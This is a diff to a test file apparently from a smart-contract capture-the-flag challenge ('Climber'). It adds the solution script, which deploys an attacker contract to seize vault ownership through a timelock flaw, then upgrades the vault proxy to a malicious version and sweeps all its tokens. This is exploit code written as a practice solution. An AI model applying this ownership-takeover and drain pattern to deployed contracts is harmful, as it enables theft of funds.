@@ -57,7 +57,18 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // 1. Exploit `ClimberTimelock` to set vault owner to player.
+        const attacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(
+            vault.address,
+            token.address
+        );
+        await attacker.attack();
+        expect(await vault.owner()).to.eq(player.address);
+
+        // 2. Upgrade original `ClimberVault` to `ClimberVault` where we can easily sweep all the tokens.
+        const climberVaultAttackerFactory = await ethers.getContractFactory("ClimberVaultAttacker", attacker);
+        const climberVaultAttacker = await upgrades.upgradeProxy(vault.address, climberVaultAttackerFactory);
+        await climberVaultAttacker.connect(player).sweepFunds(token.address);
     });
 
     after(async function () {
